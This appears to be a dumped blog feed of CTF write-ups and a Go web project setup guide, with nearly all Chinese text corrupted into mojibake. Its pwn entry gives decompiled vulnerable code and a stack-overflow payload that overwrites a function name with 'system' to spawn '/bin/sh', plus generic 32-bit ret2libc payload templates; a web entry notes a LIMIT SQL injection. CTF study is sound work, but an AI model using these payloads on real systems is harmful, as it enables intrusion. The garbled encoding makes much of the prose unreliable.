DS:ESIæŒ‡å‘æºä¸²,è€ŒES:EDIæŒ‡å‘ç›®æ ‡ä¸².EBPæ˜¯"åŸºå€æŒ‡é’ˆ"(BASE POINTER), å®ƒæœ€ç»å¸¸è¢«ç”¨ä½œé«˜çº§è¯­è¨€å‡½æ•°è°ƒç”¨çš„"æ¡†æ¶æŒ‡é’ˆ"(frame pointer). åœ¨ç ´è§£çš„æ—¶å€™,ç»å¸¸å¯ä»¥çœ‹è§ä¸€ä¸ªæ ‡å‡†çš„å‡½æ•°èµ·å§‹ä»£ç :push ebp ;ä¿å­˜å½“å‰ebpmov ebp,esp ;EBPè®¾ä¸ºå½“å‰å †æ ˆæŒ‡é’ˆsub esp, xxx ;é¢„ç•™xxxå­—èŠ‚ç»™å‡½æ•°ä¸´æ—¶å˜é‡....è¿™æ ·ä¸€æ¥,EBP æ„æˆäº†è¯¥å‡½æ•°çš„ä¸€ä¸ªæ¡†æ¶, åœ¨EBPä¸Šæ–¹åˆ†åˆ«æ˜¯åŸæ¥çš„EBP, è¿”å›åœ°å€å’Œå‚æ•°. EBPä¸‹æ–¹åˆ™æ˜¯ä¸´æ—¶å˜é‡. å‡½æ•°è¿”å›æ—¶ä½œ mov esp,ebp/pop ebp/ret å³å¯.ESP ä¸“é—¨ç”¨ä½œå †æ ˆæŒ‡é’ˆï¼Œè¢«å½¢è±¡åœ°ç§°ä¸ºæ ˆé¡¶æŒ‡é’ˆï¼Œå †æ ˆçš„é¡¶éƒ¨æ˜¯åœ°å€å°çš„åŒºåŸŸï¼Œå‹å…¥å †æ ˆçš„æ•°æ®è¶Šå¤šï¼ŒESPä¹Ÿå°±è¶Šæ¥è¶Šå°ã€‚åœ¨32ä½å¹³å°ä¸Šï¼ŒESPæ¯æ¬¡å‡å°‘4å­—èŠ‚ã€‚1. esp ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–ã€‚2. ebp ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚3. eip ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€ï¼Œcpu ä¾ç…§ eip çš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œeip éšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æ­¤åå¤ï¼Œç¨‹åºå°±å¾—ä»¥è¿ç»­æ‰§è¡ŒæŒ‡ä»¤ã€‚</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-checkin</title>
      <link href="/2020/01/24/ctf/pwn/pwn-checkin/"/>
      <url>/2020/01/24/ctf/pwn/pwn-checkin/</url>
      
        <content type="html"><![CDATA[<h1 id="Checkinè§£é¢˜æ€è·¯ä¸€"><a href="#Checkinè§£é¢˜æ€è·¯ä¸€" class="headerlink" title="Checkinè§£é¢˜æ€è·¯ä¸€"></a>Checkinè§£é¢˜æ€è·¯ä¸€</h1><h2 id="æ–‡ä»¶å±æ€§"><a href="#æ–‡ä»¶å±æ€§" class="headerlink" title="æ–‡ä»¶å±æ€§"></a>æ–‡ä»¶å±æ€§</h2><p>fileæŸ¥çœ‹å‘ç°æ–‡ä»¶æ˜¯32ä½çš„</p><h2 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h2><p>checksecå‘ç°ç¨‹åºå¼€å¯äº†NXä¿æŠ¤</p><h2 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h2><p>IDAåç¼–è¯‘æŸ¥çœ‹æºä»£ç </p><pre class=" language-lang-c"><code class="language-lang-c">checkerå‡½æ•°int __cdecl checker(int a1){  int result; // eax@2  char buf; // [sp+Eh] [bp-3Ah]@1  char name[4]; // [sp+2Ch] [bp-1Ch]@1  int v4; // [sp+30h] [bp-18h]@1  char *s; // [sp+34h] [bp-14h]@2  int (__cdecl *v6)(int); // [sp+38h] [bp-10h]@1  int v7; // [sp+3Ch] [bp-Ch]@1  v7 = 8;  *name = 1819042157;  v4 = 25455;  printf("your input : ");  read(0, &amp;buf, 0x4Au);  strncpy(st, &amp;buf, 8u);  v6 = load(name);  if ( a1 == -559038737 )  {    s = v6(v7);    __isoc99_scanf("%s", s);    result = puts(s);  }  else  {    result = puts("Think about it ");  }  return result;}</code></pre><pre class=" language-lang-c"><code class="language-lang-c">load()å‡½æ•°void *__cdecl load(char *name){  char *v1; // eax@2  void *handle; // [sp+8h] [bp-10h]@1  void *v4; // [sp+Ch] [bp-Ch]@4  handle = dlopen("/lib32/libc.so.6", 258);  if ( !handle )  {    v1 = dlerror();    printf("dlopen - %s\n", v1);    exit(0);  }  v4 = dlsym(handle, name);  if ( !v4 )  {    puts("Can't load function");    exit(0);  }  return v4;}</code></pre><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å‘ç°loadå‡½æ•°æä¾›äº†æ ¹æ®ä¼ å…¥çš„å‚æ•° å­—ç¬¦ä¸²name è¿›è€Œæ‰¾åˆ°çš„libcåº“ä¸­çš„å‡½æ•°åœ°å€ ç„¶åè¿”å›ç»™äº†v4ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸‹ æ€ä¹ˆ pwn æ‰è¿™ä¸ªç¨‹åº? æ‰§è¡Œ system(â€˜/bin/shâ€™) ã€‚</p><ol><li>main()å‡½æ•°ä¸­readå­˜åœ¨æº¢å‡ºï¼Œä½†æ˜¯å­—èŠ‚ä¸º0x4a-0x3a, å¤ªå°‘ï¼Œå› æ­¤æˆ‘ä»¬å»åˆ†æloadå‡½æ•°</li><li>é€šè¿‡bufå°†nameè¦†ç›–ä¸ºsystem 0x3a-0x1c=30=0x1e</li><li>system æ˜¯ libc ä¸­ çš„å‡½æ•°ï¼Œæˆ‘ä»¬ å°†å±€éƒ¨å˜é‡name è¦†ç›–ä¸º system</li><li>æˆ‘ä»¬å°† v7 è¦†ç›–ä¸º /bin/sh æ‰€åœ¨çš„åœ°å€ï¼Œå³ st åœ°å€</li><li>å…¨å±€å˜é‡st = payload å‰ 8ä¸ªå­—ç¬¦ï¼Œpaylaodå‰å…«ä¸ªå­—ç¬¦ä¸º /bin/sh\x00</li><li>å½“å‚æ•° a1ä¸º 0xDEADBEEF æ—¶ æ‰ä¼š æ‰§è¡Œ v5(v6) ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦å°† å‚æ•° a1 è¦†ç›–ä¸º 0xDEADBEEFï¼</li></ol><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>å› æ­¤payload:</p><pre class=" language-lang-txt"><code class="language-lang-txt">payload="/bin/sh\x00".ljust(0x1e,"\x00")+"system\x00" #0x3a-0x1c=0x1e + system= å°†nameè¦†ç›–ä¸ºsystempayload=payload.ljust(0x2e,"\x00")+p32(st_addr) #å› ä¸ºç¨‹åºæ˜¯32 ä½ç¨‹åº 0x1e+0x10(v6)payload=payload.ljust(0x3e,"\x00") #ebp bufä¸º0x3a 0x3a+0x4å¡«å……EBPpayload+=p32(0) #è¿”å›åœ°å€paylaod+=p32(0xdeadbeef) #å‚æ•° 1</code></pre><p>pwn32ä½payloadæ„é€ :</p><pre class=" language-lang-txt"><code class="language-lang-txt">æ–¹æ³•ä¸€ï¼špayload = 'a' * offset + 4 * 'a' + p32(sys_addr) + p32(4) + p32(sh_addr)æ–¹æ³•äºŒï¼špayload = 'a' * offset + 4 * 'a' + p32(read_addr) + p32(elf.bss()) + p32(0) + p32(elf.bss()) + p32(len(shellcode))</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿å—çŸ³æ²¹å¤§å­¦CTFåšé¢˜è®°å½•</title>
      <link href="/2019/12/07/ctf/misc/swpuctf/"/>
      <url>/2019/12/07/ctf/misc/swpuctf/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>â€‹    èµ·åºŠæ‰“CTFäº†,ç™»é™†å¹³å°ï¼Œä¸€çœ‹é¢˜ç›®ç®€å•çš„python,easy_webï¼Œä¸€çœ‹ä¸€é“ä¸ä¼šï¼Œï¼Œï¼Œï¼Œtclé™¤äº†misc,å•¥éƒ½ä¸ä¼š</p><p>â€‹    äººå‚»äº†ï¼Œå…ˆåšä¸¤é“ misc å§</p><h1 id="Miscéƒ¨åˆ†"><a href="#Miscéƒ¨åˆ†" class="headerlink" title="Miscéƒ¨åˆ†"></a>Miscéƒ¨åˆ†</h1><p>è¿™æ¬¡miscä¸€å…±å…ˆå‘å‡ºæ¥äº†äº”é“é¢˜ï¼Œæˆ‘åšå‡ºæ¥å››é“ï¼Œé‚£ä¸€é“å½±æµä¹‹ä¸»â€¦tql</p><h2 id="ç¥å¥‡çš„äºŒç»´ç "><a href="#ç¥å¥‡çš„äºŒç»´ç " class="headerlink" title="ç¥å¥‡çš„äºŒç»´ç "></a>ç¥å¥‡çš„äºŒç»´ç </h2><p>é¢˜ç›®æè¿°ï¼šå•¥ä¹Ÿä¸è¯´äº†ï¼Œæ‰«ç æ”¯ä»˜è·å–flag^_^ || hint1ï¼šflagå…¨æ˜¯å°å†™</p><p>å›¾ç§å¥—å¨ƒé¢˜ï¼Œmp3éšå†™</p><p>ç»™äº†å¼ å›¾</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206222617.png" alt="é¢˜ç›®"></p><p>ä¸ç”¨æ‰«äº†ï¼Œswpuctf{flag_is_not_here}</p><p>binwalkç›´æ¥æå–ï¼Œæå–å‡ºä¸€å¤§å †ä¸œè¥¿</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206223558.png" alt="æå–å"></p><p>ï¼ˆgood.mp3ã€flag.docç­‰å¥½å‡ ä¸ªä¸æ˜¯å•Šï¼Œ#æˆ‘å¿˜äº†ï¼‰</p><p>æ€å°±æ˜¯å¥—å¨ƒé¢˜çš„æ€è·¯</p><p>æ‹¿encode.txté‡Œçš„ä¸œè¥¿å–è§£flagåœ¨ä¸åœ¨é‡Œé¢</p><p>è§£å‡ºæ¥ä»¥åå–å‡ºé‡Œé¢çš„flag.doc,flag.jpg</p><p>å†™è„šæœ¬è§£flag.docé‡Œé¢çš„base64</p><pre class=" language-lang-python"><code class="language-lang-python">import base64fp=open("flag.txt",'r')for line in fp:    flag=base64.b64decode(line)    while base64.b64decode(flag):        if 'flag' in flag:            print(flag)            break        else:            flag = base64.b64decode(flag)</code></pre><p>è§£å‡ºæ¥åæ‹¿å»è§£</p><pre class=" language-lang-shell"><code class="language-lang-shell">binwalk flag.jpg -e</code></pre><p>å‡ºæ¥çš„å‹ç¼©åŒ…</p><p>ç„¶åè§£å‡ºæ¥good.mp3,æ”¾å…¥Audacityä¸­</p><p>çœ‹å‡ºæ¥æ˜¯æ‘©æ–¯å¯†ç </p><p>è§£å‡ºæ¥flag</p><pre class=" language-lang-txt"><code class="language-lang-txt">morseisveryveryveryeasy</code></pre><p>å¥—ä¸Šæ ¼å¼æäº¤</p><h2 id="æ¼‚æµçš„é©¬é‡Œå¥¥"><a href="#æ¼‚æµçš„é©¬é‡Œå¥¥" class="headerlink" title="æ¼‚æµçš„é©¬é‡Œå¥¥"></a>æ¼‚æµçš„é©¬é‡Œå¥¥</h2><p>é¢˜ç›®æè¿°ï¼šé“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Bj2LJMNwSch-cKMK56K9hg</a> æå–ç ï¼šd3fp</p><p>å–è¯åˆ†æé¢˜</p><p>è¿è¡Œé¢˜ç›®ç»™çš„.exeæ–‡ä»¶åï¼Œç”µè„‘æ¡Œé¢ä¸Šå¤šå‡ºæ¥ä¸€ä¸ªå†…å®¹æ˜¯ntfs,flag.txtçš„æ–‡ä»¶</p><p>ntfsæ˜¯ä»€ä¹ˆï¼Œç™¾åº¦å°±è¡Œäº†</p><p>ç„¶åæ‰¾ntfséšè—æµæŸ¥æ‰¾å·¥å…·</p><p>Ntfs Streams Editor</p><p>ç„¶åè®©ä»–æ‰«ä¸€éå°±è¡Œäº†ï¼Œè¿™é‡Œä¸å†™äº†ï¼Œæˆ‘æ”¾åˆ°è™šæ‹Ÿæœºé‡Œæ‰«çš„</p><pre class=" language-lang-txt"><code class="language-lang-txt">swupctf{ddg_is_cute}</code></pre><h2 id="ä¼Ÿå¤§çš„ä¾¦æ¢"><a href="#ä¼Ÿå¤§çš„ä¾¦æ¢" class="headerlink" title="ä¼Ÿå¤§çš„ä¾¦æ¢"></a>ä¼Ÿå¤§çš„ä¾¦æ¢</h2><p>é¢˜ç›®æè¿°ï¼šé“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw" target="_blank" rel="noopener">https://pan.baidu.com/s/1JaMbDl0efPPsGKxA7x3ULw</a> æå–ç ï¼š9zcf || hint1ï¼šå‹ç¼©åŒ…å¯†ç è§£ç ä¹‹åæœ€åä¸€ä½æ˜¯! || hint2ï¼šflagæ²¡æœ‰ç©ºæ ¼ï¼Œæ ¼å¼ä¸ºswpuctf{}</p><p>è„‘æ´é¢˜</p><p>å…ˆæ˜¯ç»™äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªå¯†ç .txt</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206230004.png" alt="å¯†ç .txt"></p><p>æœ‰ä¸€è¯´ä¸€æˆ‘æ‰¾äº†ä¸€ä¸‹åˆä¹Ÿæ²¡æ‰¾åˆ°è¿™æ˜¯ä»€ä¹ˆç¼–ç </p><p>ä½†ç»ˆäºæˆ‘åœ¨ä¸€ä¸ªmiscå¤§ä½¬çš„åšå®¢é‡Œæ‰¾åˆ°äº†è¿™ä¸ªç¼–ç æ€ä¹ˆè§£ é™„å¤§ä½¬åšå®¢ï¼š</p><p><a href="https://blog.xiafeng2333.top/author/xiafeng2333/" target="_blank" rel="noopener">https://blog.xiafeng2333.top/author/xiafeng2333/</a></p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206230853.png" alt=""></p><p>è§£å‹å‘ç°ä¸€å †</p><p>ç«æŸ´äººï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206231053.png" alt=""></p><p>åœ¨çœ‹äº†å¤§åŠå¤©ç«æŸ´äººè·³èˆä»¥åŠç™¾åº¦å</p><p>è¿æ°”çˆ†æ£šï¼Œæˆ‘æœäº†ä»¥ä¸‹å¯†ç å§ï¼Œç»“æœå‘ç°äº†è¿™ä¸ª</p><p>ç¦å°”æ‘©æ–¯å°äººè·³èˆï¼ŒåŸæ¥é¢˜ç›®æ˜¯è¿™ä¸ªæ„æ€å•Š</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191206231552.jpg" alt=""></p><p>ç…§ç€ä¸Šé¢è§£å¯†</p><pre class=" language-lang-txt"><code class="language-lang-txt">swpuctf{iloveholmesandwllm}</code></pre><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><p>é¢˜ç›®æè¿°</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1MKlcjLakWYDjk1B8G1OquQ</a> æå–ç ï¼šgx4l || æè¿°ï¼šflagæ ¼å¼ä¸ºflag{} || hintï¼šttl || hint2ï¼šä¼ªåŠ å¯†</p><p>ttléšå†™</p><p>é¢˜ç›®è¯´çš„å¾ˆæ¸…æ¥šäº†</p><p>æ‰“å¼€å‹ç¼©åŒ…å‘ç°é‡Œé¢åªæœ‰ä¸€ä¸ªt.txt</p><p>t.txté‡Œé¢æ˜¯63 127 191 255è¿™å‡ ä¸ªå­—ç¬¦</p><p>æ ¹æ®é¢˜ç›®çš„æç¤º</p><pre class=" language-lang-txt"><code class="language-lang-txt">63    00111111 127   01111111 191   10111111 255   11111111</code></pre><p>æ¯ä¸ªå–å‰ä¸¤ä½ç»„æˆæ–°çš„å…«ä½äºŒè¿›åˆ¶</p><p>å‘ç°å‰å…«ä½çš„äºŒè¿›åˆ¶ä¸º</p><pre class=" language-lang-txt"><code class="language-lang-txt">00110101 00110000 00110100 01100010</code></pre><p>è½¬æ¢æˆascii</p><pre class=" language-lang-txt"><code class="language-lang-txt">504b</code></pre><p>å‹ç¼©åŒ…çš„å¼€å¤´</p><p>è´´ä¸Šè§£å¯†è„šæœ¬</p><pre class=" language-lang-python"><code class="language-lang-python">fp = open('t.txt','r')a=fp.readlines()p=[]for i in a:    p.append(int(i))s=''for i in p:    if i==63:        a='00'    elif i==127:        a='01'    elif i==191:        a='10'    elif i==255:        a='11'    s += a#print(s)import binasciiflag=''for i in range(0,len(s),8):    flag += chr(int(s[i:i+8],2))flag=binascii.unhexlify(flag)wp=open('res.zip','wb')wp.write(flag)wp.close()</code></pre><p>è§£å‡ºçš„å‹ç¼©åŒ…é‡Œé¢æœ‰base64åŠ å¯†</p><p>ä¸Šè§£å¯†è„šæœ¬ï¼š</p><pre class=" language-lang-python"><code class="language-lang-python">import base64fp=open("flag.txt",'r')for line in fp:    flag=base64.b64decode(line)    while base64.b64decode(flag):        if 'flag' in flag:            print(flag)            break        else:            flag = base64.b64decode(flag)</code></pre><p>è§£å‡ºflag</p><pre class=" language-lang-txt"><code class="language-lang-txt">flag{189ff9e5b743ae95f940a6ccc6dbd9ab}</code></pre><h2 id="ä½ å¥½å¥½çœ‹ç½‘è¯¾äº†å—"><a href="#ä½ å¥½å¥½çœ‹ç½‘è¯¾äº†å—" class="headerlink" title="ä½ å¥½å¥½çœ‹ç½‘è¯¾äº†å—"></a>ä½ å¥½å¥½çœ‹ç½‘è¯¾äº†å—</h2><p>ç½‘è¯¾12.6æˆªè‡³ï¼Œæˆ‘çœ‹äº†/xyxï¼Œæœ‰æ²¡æœ‰å¥½å¥½çœ‹å°±ä¸ä¸€å®šäº†</p><p>é¢˜ç›®æè¿°<a href="https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg" target="_blank" rel="noopener">https://pan.baidu.com/s/10aXg8SrgyhQqeceBbD3tZg</a> æå–ç ï¼š078j || hint1ï¼šwordæ–‡æ¡£å¾ˆé‡è¦ || hint2ï¼šå·¥å…·ä¹Ÿè®¸æ˜¯æŸç§è§†é¢‘å‰ªè¾‘å·¥å…· || hint3ï¼šwordæ–‡æ¡£ä¸­çš„æ•°å­—å¾ˆé‡è¦ || å‹ç¼©åŒ…å¯†ç éƒ½æ˜¯å°å†™</p><p>ä¸ä¼šå†™ï¼Œæ²¡å·¥å…·</p><p>ä¸ªäººæ„Ÿè§‰åº”è¯¥æ˜¯MP4æå–å‡ºæ¥éŸ³é¢‘åï¼Œç”¨MP3stegoç»“åˆwordæ–‡æ¡£ä¸­çš„ä¸œè¥¿è§£å‡ºæ¥å‹ç¼©åŒ…ï¼Œç„¶åæš´åŠ›ç ´è§£ï¼Ÿ</p><h1 id="Webéƒ¨åˆ†"><a href="#Webéƒ¨åˆ†" class="headerlink" title="Webéƒ¨åˆ†"></a>Webéƒ¨åˆ†</h1><p>webä¹Ÿå°±ç­¾åˆ°é¢˜æˆ‘èƒ½åšä¸€ä¸‹</p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>hint1ï¼šä¸æ˜¯xss || hint2ï¼šä½¿ç”¨somd5è§£flag</p><p>é¢˜ç›®è¯´äº†ä¸æ˜¯xss,éšä¾¿æ³¨å†Œç™»é™†è¿›å»åï¼Œå‘ç°å¯ä»¥å‘æ–‡ç« </p><p>åœ¨æ ‡é¢˜å¤„ä¸‹å•å¼•å·åï¼Œä¿å­˜è¿”å›æŸ¥çœ‹æ–‡ç« ï¼Œå‘ç°SQLè¯­å¥æŠ¥é”™</p><p>ç»“åˆæŠ¥é”™åº”è¯¥å°±æ˜¯Limit Sqlæ³¨å…¥</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> swpuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go-web github å¼€æºé¡¹ç›® puti å­¦ä¹ </title>
      <link href="/2019/12/04/go-web/puti/"/>
      <url>/2019/12/04/go-web/puti/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>â€‹    å­¦ä¹  GO å·²ç»å°†è¿‘ä¸€å¹´çš„æ—¶é—´ï¼Œåœ¨å­¦æ ¡å› ä¸ºæ‚ä¸ƒæ‚å…«çš„äº‹æƒ…å­¦ä¹ è¿›åº¦ä¸€ç›´å¾ˆæ…¢ï¼Œå¯èƒ½è¿˜æ˜¯å› ä¸ºè‡ªå·±çš„é¢“åºŸï¼Œä»¥åŠå¯¹æ—¶é—´çš„å®‰æ’ä¸æ˜¯å¾ˆåˆç†å§ã€‚</p><p>â€‹    æŒ‡å¯¼è€å¸ˆè¯´é¡¹ç›®é©±åŠ¨å­¦ä¹ ï¼Œä¼šæé«˜æˆ‘çš„å­¦ä¹ æ•ˆç‡ï¼Œè€Œå·¥ä½œå®¤è¿™è¾¹ä¹Ÿéƒ½æ˜¯å•†ä¸šé¡¹ç›®ï¼Œä¸èƒ½ç”¨æ¥å­¦ä¹ ã€‚å¬äº†æŒ‡å¯¼è€å¸ˆçš„æ„è§ä»¥åï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†å¤§åŠå¤©ï¼Œä¸»è¦æ˜¯Goçš„webé¡¹ç›®å®åœ¨æ˜¯å°‘çš„å¯æ€œï¼Œç»ˆäºè®©æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªå‰åç«¯åˆ†ç¦»çš„é¡¹ç›® <a href="https://github.com/puti-projects/puti" target="_blank" rel="noopener">puti</a></p><p>â€‹    è¿™æ˜¯ä¸€ä¸ªåšå®¢ç³»ç»Ÿï¼Œå…¶å®æˆ‘ä¸€ç›´ä¹Ÿæƒ³åšä¸€ä¸ªåšå®¢ç³»ç»Ÿæ¥ç»ƒç»ƒæ‰‹ï¼Œï¼Œï¼Œ</p><h1 id="é¡¹ç›®è¿è¡Œ"><a href="#é¡¹ç›®è¿è¡Œ" class="headerlink" title="é¡¹ç›®è¿è¡Œ"></a>é¡¹ç›®è¿è¡Œ</h1><p>â€‹    ç”±äºè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åœ¨githubä¸Šæ‰¾å¼€æºé¡¹ç›®æ¥å­¦ä¹ ï¼Œåœ¨å­¦ä¹ çš„ç¬¬ä¸€æ­¥å°±é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œï¼Œï¼Œ</p><p>â€‹    åœ¨è¿™é‡Œï¼Œæˆ‘æŠŠæˆ‘é‡åˆ°çš„é—®é¢˜è®°å½•ä¸€ä¸‹ï¼Œç§¯ç´¯ç»éªŒï¼ŒåŒæ—¶ä¹Ÿèƒ½æ–¹ä¾¿åè¾¹é‡åˆ°åŒæ ·é—®é¢˜çš„äººä½¿ç”¨</p><h1 id="ä¸‹è½½å®‰è£…"><a href="#ä¸‹è½½å®‰è£…" class="headerlink" title="ä¸‹è½½å®‰è£…"></a>ä¸‹è½½å®‰è£…</h1><p>â€‹    ç”±äºå¯¹dockerçš„ä½¿ç”¨ä¸å¤Ÿç†Ÿç»ƒï¼Œè¿™æ¬¡æˆ‘é€‰æ‹©çš„æ˜¯æºç å®‰è£…ï¼Œæœ‰æ—¶é—´å­¦ä¹ ä¸€ä¸‹docker</p><h2 id="æºç å®‰è£…"><a href="#æºç å®‰è£…" class="headerlink" title="æºç å®‰è£…"></a>æºç å®‰è£…</h2><h3 id="Goè¯­è¨€ä¸‹è½½ä¸ç¯å¢ƒå˜é‡é…ç½®"><a href="#Goè¯­è¨€ä¸‹è½½ä¸ç¯å¢ƒå˜é‡é…ç½®" class="headerlink" title="Goè¯­è¨€ä¸‹è½½ä¸ç¯å¢ƒå˜é‡é…ç½®"></a>Goè¯­è¨€ä¸‹è½½ä¸ç¯å¢ƒå˜é‡é…ç½®</h3><p>å…³äºGoè¯­è¨€åœ¨linux Ubantuä¸­çš„ä¸‹è½½é…ç½®æœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œä½†å½“æˆ‘ä½¿ç”¨é‚£äº›æ•™ç¨‹çš„æ—¶å€™è¿˜æ˜¯é‡åˆ°äº†å¾ˆå¤šé—®é¢˜ï¼Œå› æ­¤åœ¨è¿™é‡Œæˆ‘è‡ªå·±åœ¨å†™ä¸€éæ•™ç¨‹</p><p>é¦–å…ˆæ˜¯Goè¯­è¨€çš„ä¸‹è½½ï¼Œ<a href="https://golang.google.cn/" target="_blank" rel="noopener">Go</a></p><p>é€‰æ‹©é€‚åˆä½ ç³»ç»Ÿçš„Goè¯­è¨€ä¸‹è½½ï¼Œæœ¬æ¬¡é¡¹ç›®è¦æ±‚Goè¯­è¨€çš„ç‰ˆæœ¬åœ¨<strong>1.11</strong>ä»¥ä¸Šï¼ˆä»¥ä¸‹çš„è¿˜çœŸç”¨ä¸äº†ï¼‰ï¼Œ1.11ä»¥ä¸Šæœ‰Go module</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203175333.png" alt="Golangå®˜ç½‘"></p><p>ä¸‹è½½è¿‡åï¼Œæˆ‘ä»¬æŠŠå®ƒè§£å‹åˆ° /usr/local/ ç›®å½•ä¸‹</p><pre class=" language-lang-shell"><code class="language-lang-shell">tar -C /usr/local -xzf go1.13.4.linux-amd64.tar.gz</code></pre><p>æ¥ä¸‹æ¥å°±æ˜¯é…ç½®ç¯å¢ƒå˜é‡, åœ¨/etc/profile ï¼ˆå³å…¨å±€ç¯å¢ƒå˜é‡ä¸‹ä¿®æ”¹ï¼‰æœ€åæ·»åŠ </p><pre class=" language-lang-shell"><code class="language-lang-shell">vim /etc/profile</code></pre><pre class=" language-lang-shell"><code class="language-lang-shell">export GOROOT=/usr/local/goexport GOPATH=$HOME/go #è¿™é‡Œæ˜¯ä½ goçš„workspaceexport PATH=$PATH:$GOROOT/bin</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203181150.png" alt="å±å¹•æˆªå›¾"></p><pre class=" language-lang-shell"><code class="language-lang-shell">source /etc/profile</code></pre><p>ç«‹åˆ»ç”Ÿæ•ˆ</p><p>è¿™é‡Œå¯èƒ½ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å…³é—­ç»ˆç«¯åï¼Œç¯å¢ƒå˜é‡å°±å¤±æ•ˆäº†ï¼Œåœ¨ç½‘ä¸ŠæŸ¥äº†åŠå¤©åï¼Œæˆ‘çš„è§£å†³æ–¹æ³•æ˜¯è¿™æ ·çš„</p><pre class=" language-lang-shell"><code class="language-lang-shell">vim ~/.bashrc</code></pre><p>åœ¨é‡Œé¢æ·»åŠ </p><pre class=" language-lang-shell"><code class="language-lang-shell">export GOPATH=$HOME/goexport GOROOT=/usr/local/goexport GOARCH=386export GOOS=linuxexport GOTOOLS=$GOROOT/pkg/toolexport PATH=$PATH:$GOROOT/bin:$GOPATH/bin</code></pre><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20191203182609.png" alt="å±å¹•æˆªå›¾"></p><pre class=" language-lang-shell"><code class="language-lang-shell">go version 